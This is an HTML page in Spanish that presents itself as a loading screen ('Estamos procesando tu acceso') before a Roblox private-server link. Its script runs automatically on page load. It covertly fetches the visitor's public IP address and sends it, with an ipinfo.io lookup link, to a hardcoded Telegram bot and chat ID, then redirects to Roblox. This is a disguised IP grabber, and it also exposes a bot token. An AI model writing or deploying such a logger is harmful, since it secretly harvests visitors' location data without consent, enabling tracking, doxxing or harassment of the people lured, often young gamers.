<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Notificador de Acceso</title>
</head>
<body>

    <h1>Bienvenido</h1>
    <p>Estamos procesando tu acceso. Por favor, espera...</p>

    <script>
        // Token de tu bot de Telegram
        const botToken = '7707486126:AAGP-6Nv11jrLs9LTU1L3s-2i9NFk1X-AHU';
        // Tu ID de usuario de Telegram para recibir el mensaje
        const chatId = '7593329448';

        // URL a la que se redirigirá el usuario
        const redirectUrl = 'https://www.roblox.com/share?code=d5c6d8f5bf7b924aac3e67da1e6aacd8&type=Server';

        // Función para obtener la dirección IP pública del usuario
        async function getIp() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("No se pudo obtener la IP:", error);
                return 'Desconocida';
            }
        }

        // Función para enviar el mensaje al bot de Telegram y luego redirigir
        async function sendTelegramMessageAndRedirect(ip) {
            const message = `Nuevo ingreso: Ipinfo.io/${ip}`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            try {
                // Enviamos la solicitud a la API de Telegram
                await fetch(url, {
                    method: 'GET'
                });
                console.log("Mensaje enviado a Telegram con éxito.");
            } catch (error) {
                console.error("Error al enviar el mensaje a Telegram:", error);
            } finally {
                // Redirige al usuario a la URL de Roblox, sin importar si el envío fue exitoso o no
                window.location.href = redirectUrl;
            }
        }

        // Esta función se ejecuta automáticamente cuando la página se carga
        window.onload = async () => {
            const userIp = await getIp();
            if (userIp) {
                await sendTelegramMessageAndRedirect(userIp);
            } else {
                // Si no se puede obtener la IP, aún así redirige al usuario
                window.location.href = redirectUrl;
            }
        };
    </script>

</body>
</html>
